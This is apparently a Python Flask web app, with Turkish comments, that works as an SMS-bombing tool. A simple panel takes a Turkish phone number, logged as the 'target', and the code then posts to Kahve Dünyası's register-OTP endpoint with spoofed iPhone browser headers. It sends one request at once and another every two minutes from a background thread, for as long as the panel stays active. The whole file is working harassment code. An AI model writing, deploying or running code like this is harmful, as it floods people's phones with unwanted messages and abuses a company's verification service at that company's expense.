import os
import time
import threading
import requests
from flask import Flask, render_template_string, request, redirect, url_for

app = Flask(__name__)

state = {
    "phone": "",
    "active": False
}

def render_log(msg):
    """Logları temizce Render konsoluna basar"""
    print(f"[RENDER LOG] {time.strftime('%H:%M:%S')} - {msg}", flush=True)

def send_kahve_dunyasi_otp():
    if not state["active"] or not state["phone"]:
        return
    
    url = "https://www.kahvedunyasi.com/api/v1/auth/register-otp"
    payload = {"mobile_number": state["phone"], "country_code": "90"}
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15",
        "Content-Type": "application/json",
        "Origin": "https://www.kahvedunyasi.com",
        "Referer": "https://www.kahvedunyasi.com/"
    }
    try:
        res = requests.post(url, json=payload, headers=headers, timeout=12, allow_redirects=False)
        render_log(f"İstek Gönderildi -> Durum Kodu: {res.status_code}")
    except Exception as e:
        render_log(f"Bağlantı Hatası: {e}")

def worker():
    """Arka planda 2 dakikada bir çalışacak motor"""
    while True:
        if state["active"] and state["phone"]:
            time.sleep(120)
            if state["active"] and state["phone"]:
                render_log("Döngü tetiklendi, yeni istek atılıyor...")
                send_kahve_dunyasi_otp()
        else:
            time.sleep(1)

# Arka plan thread kontrolü
if not any(t.name == "SMSWorker" for t in threading.enumerate()):
    threading.Thread(target=worker, name="SMSWorker", daemon=True).start()

# --- SADE VE ŞIK TASARIM (UI) ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Engine</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0a0a0c; color: #e4e4e7; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: #121214; border: 1px solid #1c1c1f; padding: 30px; border-radius: 16px; width: 100%; max-width: 340px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
        input { width: 100%; padding: 14px; background: #18181b; border: 1px solid #27272a; border-radius: 10px; color: #fff; font-size: 16px; text-align: center; outline: none; transition: border 0.2s; box-sizing: border-box; margin-bottom: 12px; }
        input:focus { border-color: #3b82f6; }
        button { width: 100%; padding: 14px; background: #3b82f6; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
        button:hover { background: #2563eb; }
        .status { font-size: 13px; color: #10b981; margin-top: 15px; font-family: monospace; letter-spacing: 0.5px; }
    </style>
</head>
<body>
    <div class="box">
        <form method="POST" action="/">
            <input type="text" name="phone" placeholder="5XXXXXXXXX" maxlength="10" value="{{ phone }}" required>
            <button type="submit">Başlat</button>
        </form>
        {% if active and phone %}
        <div class="status">+90 {{ phone }} başlatıldı...</div>
        {% endif %}
    </div>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        p = request.form.get('phone', '').strip()
        if len(p) == 10 and p.isdigit():
            state["phone"] = p
            state["active"] = True
            render_log(f"Panel üzerinden tetiklendi -> Hedef: +90{p}")
            # Butona basıldığı an ilk istek sıfırıncı saniyede gider
            send_kahve_dunyasi_otp()
        return redirect(url_for('index'))

    return render_template_string(HTML_TEMPLATE, phone=state["phone"], active=state["active"])

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
